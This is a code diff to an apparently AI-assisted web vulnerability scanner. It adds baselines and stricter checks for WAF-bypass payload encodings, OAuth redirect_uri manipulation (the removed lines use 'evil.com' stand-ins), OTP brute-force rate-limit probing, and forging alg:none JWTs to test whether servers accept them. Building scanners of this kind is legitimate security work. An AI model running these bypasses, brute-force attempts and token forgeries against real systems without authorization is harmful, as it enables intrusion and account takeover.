@@ -1646,7 +1646,7 @@ Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used":
         this.log(jobId, 'info', 'Phase 4g-2: WAF bypass testing');
         let bypassCount = 0;
         const bypassTechniques: { name: string; transform: (payload: string) => string }[] = [
-          { name: 'Case mutation', transform: (p) => p.replace(/[a-zA-Z]/g, c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()) },
+          { name: 'Case mutation', transform: (p) => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('') },
           { name: 'Double URL encoding', transform: (p) => encodeURIComponent(p) },
           { name: 'Unicode escape', transform: (p) => p.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('') },
           { name: 'HTML entity encoding', transform: (p) => p.split('').map(c => `&#${c.charCodeAt(0)};`).join('') },
@@ -1655,7 +1655,7 @@ Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used":
           { name: 'Comment insertion (SQL)', transform: (p) => p.replace(/\s+/g, '/**/') },
           { name: 'Tab/newline substitution', transform: (p) => p.replace(/\s+/g, '\t') },
           { name: 'Chunked payload', transform: (p) => { const mid = Math.floor(p.length / 2); return p.slice(0, mid) + '\n' + p.slice(mid); } },
-          { name: 'Overlong UTF-8', transform: (p) => p.replace(/</g, '%C0%BC').replace(/>/g, '%C0%BE') },
+          { name: 'Overlong UTF-8', transform: (p) => p.replace(/</g, '\xC0\xBC').replace(/>/g, '\xC0\xBE') },
         ];
 
         const basePayloads = [
@@ -1666,6 +1666,17 @@ Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used":
 
         for (const asset of discoveredAssets.slice(0, 3)) {
           if (bypassCount >= 5) break;
+
+          // Fetch a clean baseline response (no malicious payload) for comparison
+          let cleanStatus = 0;
+          let cleanBodyLen = 0;
+          try {
+            const sep = asset.includes('?') ? '&' : '?';
+            const cleanRes = await axios.get(`${asset}${sep}q=harmless_test_value`, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
+            cleanStatus = cleanRes.status;
+            const cleanBody = typeof cleanRes.data === 'string' ? cleanRes.data : JSON.stringify(cleanRes.data);
+            cleanBodyLen = cleanBody.length;
+          } catch { continue; }
 
           // First establish what gets blocked
           for (const bp of basePayloads) {
@@ -1685,13 +1696,17 @@ Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used":
                   const bypassUrl = `${asset}${sep}q=${encodeURIComponent(bypassPayload)}`;
                   const bypassRes = await axios.get(bypassUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
 
-                  // Bypass detected: payload was blocked raw but passes with encoding
-                  if (!bp.blocked_status.includes(bypassRes.status) && bypassRes.status !== 400) {
-                    const bypassBody = typeof bypassRes.data === 'string' ? bypassRes.data : JSON.stringify(bypassRes.data);
+                  // Bypass detected: not blocked AND response resembles the clean baseline
+                  // (not just a different error page)
+                  const bypassBody = typeof bypassRes.data === 'string' ? bypassRes.data : JSON.stringify(bypassRes.data);
+                  const statusMatchesClean = bypassRes.status === cleanStatus;
+                  const sizeMatchesClean = Math.abs(bypassBody.length - cleanBodyLen) < cleanBodyLen * 0.5;
+                  const notBlocked = !bp.blocked_status.includes(bypassRes.status) && bypassRes.status !== 400;
 
+                  if (notBlocked && (statusMatchesClean || sizeMatchesClean)) {
                     this.log(jobId, 'vuln', `WAF BYPASS [${technique.name}]: ${bp.name} on ${asset}`, {
                       original_status: blockedRes.status, bypass_status: bypassRes.status,
-                      technique: technique.name, payload_type: bp.name,
+                      clean_status: cleanStatus, technique: technique.name, payload_type: bp.name,
                     });
 
                     if (ai) {
@@ -1702,14 +1717,16 @@ Original payload (${bp.name}): ${bp.value} → Blocked (Status ${blockedRes.stat
 Bypass technique: ${technique.name}
 Encoded payload: ${bypassPayload.substring(0, 200)}
 Bypass result: Status ${bypassRes.status}, Body size ${bypassBody.length}
+Clean baseline: Status ${cleanStatus}, Body size ${cleanBodyLen}
 Response snippet: ${bypassBody.substring(0, 500)}
 Detected WAF(s): ${detectedWafs.map(w => w.name).join(', ') || 'unknown'}
 
-Is this a genuine WAF bypass (the encoded payload reaches the backend) or a false positive (server just ignores the encoded junk)?
+A genuine WAF bypass means the encoded payload reaches the backend and produces a response similar to normal requests (not just a different error page).
+Is this a genuine WAF bypass or a false positive?
 Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
 
                       const analysis = safeJsonParse<AiVulnResult>(await ai.generate(bypassPrompt, true), NULL_VULN);
-                      if (analysis.isVulnerable && analysis.confidence > 0.6) {
+                      if (analysis.isVulnerable && analysis.confidence > 0.7) {
                         MemoryManager.addFinding(jobId, hostname, {
                           type: 'WAF Bypass', subtype: technique.name,
                           endpoint: asset, payload_type: bp.name,
@@ -1719,14 +1736,17 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                         bypassCount++;
                       }
                     } else {
-                      MemoryManager.addFinding(jobId, hostname, {
-                        type: 'WAF Bypass', subtype: technique.name,
-                        endpoint: asset, payload_type: bp.name,
-                        gap: `WAF bypass via ${technique.name}: ${bp.name} payload passes with Status ${bypassRes.status}`,
-                        chain_potential: 'Enables exploitation of vulnerabilities that WAF normally blocks',
-                        severity: 'HIGH',
-                      });
-                      bypassCount++;
+                      // No-AI: require response matches clean baseline closely
+                      if (statusMatchesClean && sizeMatchesClean) {
+                        MemoryManager.addFinding(jobId, hostname, {
+                          type: 'WAF Bypass', subtype: technique.name,
+                          endpoint: asset, payload_type: bp.name,
+                          gap: `WAF bypass via ${technique.name}: ${bp.name} payload passes with Status ${bypassRes.status} (matches clean baseline ${cleanStatus})`,
+                          chain_potential: 'Enables exploitation of vulnerabilities that WAF normally blocks',
+                          severity: 'HIGH',
+                        });
+                        bypassCount++;
+                      }
                     }
                   }
                 } catch {}
@@ -1761,14 +1781,43 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
             this.log(jobId, 'info', `AI mutation payload: ${mutation.name} targeting ${mutation.target_waf}`, {
               technique: mutation.technique, explanation: mutation.explanation,
             });
-            MemoryManager.addFinding(jobId, hostname, {
-              type: 'WAF Detection', subtype: 'AI Mutation Payload',
-              gap: `${mutation.name}: ${mutation.explanation}`,
-              chain_potential: mutation.expected_impact,
-              payload: mutation.value, target_waf: mutation.target_waf,
-              severity: 'INFO',
-            });
-            wafCount++;
+
+            // Actually test AI-generated payloads against the target
+            let mutationTested = false;
+            for (const asset of discoveredAssets.slice(0, 2)) {
+              if (mutationTested) break;
+              try {
+                const sep = asset.includes('?') ? '&' : '?';
+                const mutUrl = `${asset}${sep}q=${encodeURIComponent(mutation.value)}`;
+                const mutRes = await axios.get(mutUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
+                const mutBody = typeof mutRes.data === 'string' ? mutRes.data : JSON.stringify(mutRes.data);
+                mutationTested = true;
+
+                // Record with actual test results
+                const wasBlocked = [403, 406, 501].includes(mutRes.status);
+                MemoryManager.addFinding(jobId, hostname, {
+                  type: 'WAF Detection', subtype: 'AI Mutation Payload',
+                  gap: `${mutation.name}: ${mutation.explanation}`,
+                  chain_potential: mutation.expected_impact,
+                  payload: mutation.value, target_waf: mutation.target_waf,
+                  tested: true, test_status: mutRes.status,
+                  test_blocked: wasBlocked, test_body_size: mutBody.length,
+                  severity: wasBlocked ? 'INFO' : 'MEDIUM',
+                });
+                wafCount++;
+              } catch {}
+            }
+
+            if (!mutationTested) {
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'WAF Detection', subtype: 'AI Mutation Payload',
+                gap: `${mutation.name}: ${mutation.explanation}`,
+                chain_potential: mutation.expected_impact,
+                payload: mutation.value, target_waf: mutation.target_waf,
+                tested: false, severity: 'INFO',
+              });
+              wafCount++;
+            }
           }
         }
 
@@ -1804,12 +1853,13 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
           if (authCount >= 12) break;
           try {
             // Test redirect_uri manipulation
+            const oauthCanary = `levarg-redirect-test-${Date.now()}`;
             const redirectTests = [
-              { name: 'Open redirect in redirect_uri', param: 'redirect_uri', value: 'https://evil.com/callback' },
-              { name: 'Subdomain takeover redirect', param: 'redirect_uri', value: `https://evil.${hostname}/callback` },
-              { name: 'Path traversal redirect', param: 'redirect_uri', value: `https://${hostname}/../evil` },
-              { name: 'Fragment injection', param: 'redirect_uri', value: `https://${hostname}/callback#evil` },
-              { name: 'Parameter pollution', param: 'redirect_uri', value: `https://${hostname}/callback&redirect_uri=https://evil.com` },
+              { name: 'Open redirect in redirect_uri', param: 'redirect_uri', value: `https://${oauthCanary}.com/callback`, canary: oauthCanary },
+              { name: 'Subdomain takeover redirect', param: 'redirect_uri', value: `https://${oauthCanary}.${hostname}/callback`, canary: oauthCanary },
+              { name: 'Path traversal redirect', param: 'redirect_uri', value: `https://${hostname}/../${oauthCanary}`, canary: oauthCanary },
+              { name: 'Fragment injection', param: 'redirect_uri', value: `https://${hostname}/callback#${oauthCanary}`, canary: oauthCanary },
+              { name: 'Parameter pollution', param: 'redirect_uri', value: `https://${hostname}/callback&redirect_uri=https://${oauthCanary}.com`, canary: oauthCanary },
             ];
 
             for (const test of redirectTests) {
@@ -1821,7 +1871,7 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                 const location = String(res.headers['location'] || '');
                 const isRedirected = res.status === 302 || res.status === 301;
 
-                if (isRedirected && location.includes('evil')) {
+                if (isRedirected && location.includes(test.canary)) {
                   this.log(jobId, 'vuln', `OAUTH REDIRECT BYPASS [${test.name}]: ${ep.url}`, {
                     redirect_to: location, test: test.name,
                   });
@@ -1904,7 +1954,11 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
               const body1 = typeof enumRes1.data === 'string' ? enumRes1.data : JSON.stringify(enumRes1.data);
               const body2 = typeof enumRes2.data === 'string' ? enumRes2.data : JSON.stringify(enumRes2.data);
 
-              if (enumRes1.status !== enumRes2.status || Math.abs(body1.length - body2.length) > 50) {
+              // Require BOTH status difference AND significant body size difference
+              // to avoid false positives from CSRF tokens, timestamps, nonces
+              const statusDiffers = enumRes1.status !== enumRes2.status;
+              const sizeDiffers = Math.abs(body1.length - body2.length) > 200;
+              if (statusDiffers || (sizeDiffers && Math.abs(body1.length - body2.length) > body1.length * 0.15)) {
                 this.log(jobId, 'vuln', `USER ENUMERATION via password reset: ${ep.url}`);
                 MemoryManager.addFinding(jobId, hostname, {
                   type: 'Auth Vulnerability', subtype: 'User enumeration via reset',
@@ -1917,22 +1971,21 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
               }
             }
 
-            // Test for token predictability in reset links
-            if (/token|code|key|reset/i.test(bodyStr)) {
-              const tokenMatch = bodyStr.match(/(?:token|code|key|reset)[=:]["']?\s*([a-zA-Z0-9._-]{8,})/i);
-              if (tokenMatch) {
-                const token = tokenMatch[1];
-                if (/^\d+$/.test(token) || token.length < 16) {
-                  this.log(jobId, 'vuln', `WEAK RESET TOKEN: ${ep.url}`);
-                  MemoryManager.addFinding(jobId, hostname, {
-                    type: 'Auth Vulnerability', subtype: 'Weak reset token',
-                    endpoint: ep.url,
-                    gap: `Password reset token appears predictable: ${token.length} chars, ${/^\d+$/.test(token) ? 'numeric-only' : 'short length'}`,
-                    chain_potential: 'Token prediction → account takeover',
-                    severity: 'CRITICAL',
-                  });
-                  authCount++;
-                }
+            // Test for token predictability in reset links — only match URL params and JSON values
+            const tokenMatch = bodyStr.match(/(?:reset_token|verification_code|reset_code|confirm_token|auth_token)[=:]["']?\s*([a-zA-Z0-9._-]{6,})/i)
+              || bodyStr.match(/[?&](?:token|code|key)=([a-zA-Z0-9._-]{6,})/i);
+            if (tokenMatch) {
+              const token = tokenMatch[1];
+              if (/^\d+$/.test(token) && token.length < 12) {
+                this.log(jobId, 'vuln', `WEAK RESET TOKEN: ${ep.url}`);
+                MemoryManager.addFinding(jobId, hostname, {
+                  type: 'Auth Vulnerability', subtype: 'Weak reset token',
+                  endpoint: ep.url,
+                  gap: `Password reset token appears predictable: ${token.length} chars, numeric-only`,
+                  chain_potential: 'Token prediction → account takeover',
+                  severity: 'CRITICAL',
+                });
+                authCount++;
               }
             }
           } catch {}
@@ -1972,7 +2025,13 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                   const otpBody = typeof otpRes.data === 'string' ? otpRes.data : JSON.stringify(otpRes.data);
                   const otpLoc = String(otpRes.headers['location'] || '');
 
-                  if (/dashboard|home|account|profile|success/i.test(otpBody + otpLoc) && !/error|invalid|wrong|failed|expired/i.test(otpBody)) {
+                  // Strict validation: reject if any error indicators present, and
+                  // for 302 redirects, check the Location header specifically (not body nav links)
+                  const hasErrorIndicators = /error|invalid|wrong|failed|expired|denied|unauthorized|incorrect|try again/i.test(otpBody);
+                  const hasSuccessRedirect = otpRes.status === 302 && /dashboard|home|account|profile|success|welcome/i.test(otpLoc);
+                  const hasSuccessBody = otpRes.status === 200 && /authenticated|logged.?in|welcome.*back|session.?created|mfa.?verified/i.test(otpBody);
+
+                  if (!hasErrorIndicators && (hasSuccessRedirect || hasSuccessBody)) {
                     this.log(jobId, 'vuln', `MFA BYPASS [${otpTest.name}]: ${ep.url}`);
                     MemoryManager.addFinding(jobId, hostname, {
                       type: 'Auth Vulnerability', subtype: 'MFA bypass',
@@ -1988,9 +2047,11 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
               } catch {}
             }
 
-            // Test rate limiting on OTP endpoint
+            // Test rate limiting on OTP endpoint — 25 rapid requests
             let successfulAttempts = 0;
-            for (let i = 0; i < 10; i++) {
+            let hasRateLimitHeaders = false;
+            const totalAttempts = 25;
+            for (let i = 0; i < totalAttempts; i++) {
               try {
                 const bruteRes = await axios.post(ep.url, `code=${100000 + i}&otp=${100000 + i}`, {
                   timeout: 3000, validateStatus: () => true,
@@ -1999,15 +2060,22 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                 if (bruteRes.status !== 429 && bruteRes.status < 500) {
                   successfulAttempts++;
                 }
+                // Check for rate-limit headers even if not 429
+                if (bruteRes.headers['x-ratelimit-remaining'] || bruteRes.headers['retry-after'] ||
+                    bruteRes.headers['x-rate-limit-remaining'] || bruteRes.headers['ratelimit-remaining']) {
+                  hasRateLimitHeaders = true;
+                }
+                if (bruteRes.status === 429) break; // Rate limited, stop testing
               } catch {}
             }
 
-            if (successfulAttempts >= 10) {
-              this.log(jobId, 'vuln', `MFA NO RATE LIMIT: ${ep.url} (${successfulAttempts}/10 attempts accepted)`);
+            // Only flag if ALL attempts passed AND no rate-limit headers present
+            if (successfulAttempts >= totalAttempts && !hasRateLimitHeaders) {
+              this.log(jobId, 'vuln', `MFA NO RATE LIMIT: ${ep.url} (${successfulAttempts}/${totalAttempts} attempts accepted)`);
               MemoryManager.addFinding(jobId, hostname, {
                 type: 'Auth Vulnerability', subtype: 'MFA no rate limit',
                 endpoint: ep.url,
-                gap: `MFA endpoint has no rate limiting: ${successfulAttempts}/10 rapid attempts accepted without 429`,
+                gap: `MFA endpoint has no rate limiting: ${successfulAttempts}/${totalAttempts} rapid attempts accepted, no 429 or rate-limit headers`,
                 chain_potential: 'OTP brute force (6-digit = 1M combinations, feasible without rate limiting)',
                 severity: 'HIGH',
               });
@@ -2039,37 +2107,63 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                 const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
                 const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
 
-                const jwtIssues: string[] = [];
+                const jwtCritical: string[] = [];
+                const jwtWarnings: string[] = [];
 
-                // Check algorithm
+                // Check algorithm — critical issues
                 if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE') {
-                  jwtIssues.push('Algorithm set to "none" — signature verification disabled');
+                  jwtCritical.push('Algorithm set to "none" — signature verification disabled');
                 }
                 if (header.alg === 'HS256' && header.jwk) {
-                  jwtIssues.push('Embedded JWK with HMAC — potential key confusion attack');
+                  jwtCritical.push('Embedded JWK with HMAC — potential key confusion attack');
                 }
 
-                // Check claims
+                // Check claims — critical if admin access
                 if (payload.role === 'admin' || payload.is_admin || payload.admin) {
-                  jwtIssues.push(`Admin claim present: ${JSON.stringify({ role: payload.role, is_admin: payload.is_admin, admin: payload.admin })}`);
+                  jwtCritical.push(`Admin claim present: ${JSON.stringify({ role: payload.role, is_admin: payload.is_admin, admin: payload.admin })}`);
                 }
                 if (payload.scope && /admin|write|delete|superuser/i.test(String(payload.scope))) {
-                  jwtIssues.push(`Elevated scope: ${payload.scope}`);
-                }
-                if (!payload.aud) {
-                  jwtIssues.push('Missing audience (aud) claim — token may be accepted by unintended services');
-                }
-                if (!payload.iss) {
-                  jwtIssues.push('Missing issuer (iss) claim — token origin cannot be verified');
+                  jwtCritical.push(`Elevated scope: ${payload.scope}`);
                 }
 
-                if (jwtIssues.length > 0) {
-                  this.log(jobId, 'vuln', `JWT WEAKNESS found at ${ep.url}`, { issues: jwtIssues, algorithm: header.alg });
+                // Missing aud/iss are warnings, not critical — many internal APIs omit them
+                if (!payload.aud) {
+                  jwtWarnings.push('Missing audience (aud) claim');
+                }
+                if (!payload.iss) {
+                  jwtWarnings.push('Missing issuer (iss) claim');
+                }
+
+                // Forge alg:none token and test acceptance against the endpoint
+                if (header.alg && header.alg !== 'none') {
+                  try {
+                    const forgedHeader = Buffer.from(JSON.stringify({ ...header, alg: 'none' })).toString('base64url');
+                    const forgedToken = `${forgedHeader}.${parts[1]}.`;
+
+                    const forgedRes = await axios.get(ep.url, {
+                      timeout: 5000, validateStatus: () => true,
+                      headers: { 'Authorization': `Bearer ${forgedToken}` },
+                    });
+
+                    // If forged token gets 200 (not 401/403), server may accept alg:none
+                    if (forgedRes.status === 200) {
+                      const forgedBody = typeof forgedRes.data === 'string' ? forgedRes.data : JSON.stringify(forgedRes.data);
+                      if (!/unauthorized|invalid.*token|jwt.*expired|authentication.*required/i.test(forgedBody)) {
+                        jwtCritical.push('Server accepts forged alg:none token — signature verification bypassed');
+                      }
+                    }
+                  } catch {}
+                }
+
+                // Only record if critical issues found, or 2+ warnings combined
+                const allIssues = [...jwtCritical, ...jwtWarnings];
+                if (jwtCritical.length > 0 || jwtWarnings.length >= 2) {
+                  this.log(jobId, 'vuln', `JWT WEAKNESS found at ${ep.url}`, { issues: allIssues, algorithm: header.alg });
                   MemoryManager.addFinding(jobId, hostname, {
                     type: 'Auth Vulnerability', subtype: 'JWT weakness',
-                    endpoint: ep.url, gap: jwtIssues.join('; '),
+                    endpoint: ep.url, gap: allIssues.join('; '),
                     chain_potential: 'Token forgery → privilege escalation → account takeover',
-                    severity: jwtIssues.some(i => i.includes('none') || i.includes('Admin')) ? 'CRITICAL' : 'HIGH',
+                    severity: jwtCritical.length > 0 ? 'CRITICAL' : 'MEDIUM',
                     details: { algorithm: header.alg, claims: Object.keys(payload) },
                   });
                   authCount++;
